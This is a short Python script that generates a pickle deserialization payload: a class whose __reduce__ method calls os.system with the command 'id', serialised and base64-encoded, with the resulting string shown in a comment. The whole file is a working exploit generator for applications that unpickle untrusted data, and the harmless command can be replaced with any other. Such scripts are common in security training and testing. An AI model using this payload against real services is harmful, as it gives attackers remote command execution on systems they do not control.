#!/usr/bin/env python3

import os
import pickle
import base64

CMD = 'id'

class RunCmd(object):
    def __reduce__(self):
        return(os.system, (CMD,))

print(base64.b64encode(pickle.dumps(RunCmd())).decode())
# gANjcG9zaXgKc3lzdGVtCnEAWAIAAABpZHEBhXECUnEDLg==